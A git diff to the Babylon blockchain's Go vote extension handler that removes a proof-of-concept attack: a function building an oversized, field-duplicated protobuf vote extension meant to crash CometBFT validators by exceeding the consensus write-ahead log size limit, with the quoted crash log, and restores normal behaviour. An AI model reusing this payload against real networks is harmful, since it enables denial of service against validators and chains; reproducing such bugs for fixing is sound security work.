@@ -8,7 +8,6 @@ import (
 	abci "github.com/cometbft/cometbft/abci/types"
 	"github.com/cosmos/cosmos-sdk/baseapp"
 	sdk "github.com/cosmos/cosmos-sdk/types"
-	"google.golang.org/protobuf/encoding/protowire"
 
 	"github.com/babylonlabs-io/babylon/v4/x/checkpointing/keeper"
 	ckpttypes "github.com/babylonlabs-io/babylon/v4/x/checkpointing/types"
@@ -98,74 +97,11 @@ func (h *VoteExtensionHandler) ExtendVote() sdk.ExtendVoteHandler {
 			panic(fmt.Errorf("failed to encode vote extension: %w", err))
 		}
 
-		const (
-			// 7:26PM ERR CONSENSUS FAILURE!!! err="failed to write {[Vote Vote{0:0A273A617C84 20/00/SIGNED_MSG_TYPE_PRECOMMIT(Precommit) 715CAF599530 C234F53855DF 0A8080400001 @ 2026-01-08T19:26:50.177660852Z}] } msg to consensus WAL due to msg is too big: 1049052 bytes, max: 1048600 bytes; check your file system and restart the node" module=consensus stack="goroutine 895 [running]:\nruntime/debug.Stack()\n\truntime/debug/stack.go:26 +0x5e\ngithub.com/cometbft/cometbft/consensus.(*State).receiveRoutine.func2()\n\tgithub.com/cometbft/cometbft@v0.38.20/consensus/state.go:801 +0x46\npanic({0x43ef280?, 0xc003488bf0?})\n\truntime/panic.go:791 +0x132\ngithub.com/cometbft/cometbft/consensus.(*State).receiveRoutine(0xc00286f508, 0x0)\n\tgithub.com/cometbft/cometbft@v0.38.20/consensus/state.go:841 +0x825\ncreated by github.com/cometbft/cometbft/consensus.(*State).OnStart in goroutine 747\n\tgithub.com/cometbft/cometbft@v0.38.20/consensus/state.go:398 +0x10c\n"
-			// paddingSizePerVal max is 1048600, but the signature and other fields already take part of it
-			paddingSizePerVal = (1024 * 1024) - 500 // 1MB per malicious validator
-		)
+		h.logger.Info("successfully sent BLS signature in vote extension",
+			"epoch", epoch.EpochNumber, "height", req.Height, "validator", valOperAddr.String())
 
-		maliciousBytes := buildMaliciousVoteExtension(
-			paddingSizePerVal,
-			ve.Signer,
-			ve.ValidatorAddress,
-			*ve.BlockHash,
-			1,
-			100,
-			blsSig,
-		)
-
-		h.logger.Info(
-			"successfully sent MALICIOOOOUS BLS signature in vote extension",
-			"epoch", epoch.EpochNumber, "height", req.Height, "validator", valOperAddr.String(), "valid-size", len(bz), "malicious-size", len(maliciousBytes))
-
-		return &abci.ResponseExtendVote{VoteExtension: maliciousBytes}, nil
+		return &abci.ResponseExtendVote{VoteExtension: bz}, nil
 	}
-}
-
-func buildMaliciousVoteExtension(
-	paddingSize int,
-	validSigner string,
-	validValidator string,
-	blockHash []byte,
-	epochNum uint64,
-	height uint64,
-	blsSig []byte,
-) []byte {
-	var buf []byte
-
-	// Field 1 (Signer) - FIRST occurrence with garbage padding
-	garbageData := make([]byte, paddingSize)
-	for i := range garbageData {
-		garbageData[i] = byte(i % 256)
-	}
-	buf = protowire.AppendTag(buf, 1, protowire.BytesType)
-	buf = protowire.AppendString(buf, string(garbageData))
-
-	// Field 1 (Signer) - SECOND occurrence with valid value
-	buf = protowire.AppendTag(buf, 1, protowire.BytesType)
-	buf = protowire.AppendString(buf, validSigner)
-
-	// Field 2 (ValidatorAddress)
-	buf = protowire.AppendTag(buf, 2, protowire.BytesType)
-	buf = protowire.AppendString(buf, validValidator)
-
-	// Field 3 (BlockHash) - custom type, encoded as raw bytes
-	buf = protowire.AppendTag(buf, 3, protowire.BytesType)
-	buf = protowire.AppendBytes(buf, blockHash)
-
-	// Field 4 (EpochNum)
-	buf = protowire.AppendTag(buf, 4, protowire.VarintType)
-	buf = protowire.AppendVarint(buf, epochNum)
-
-	// Field 5 (Height)
-	buf = protowire.AppendTag(buf, 5, protowire.VarintType)
-	buf = protowire.AppendVarint(buf, height)
-
-	// Field 6 (BlsSig) - custom type, encoded as bytes
-	buf = protowire.AppendTag(buf, 6, protowire.BytesType)
-	buf = protowire.AppendBytes(buf, blsSig)
-
-	return buf
 }
 
 // VerifyVoteExtension verifies the BLS sig within the vote extension
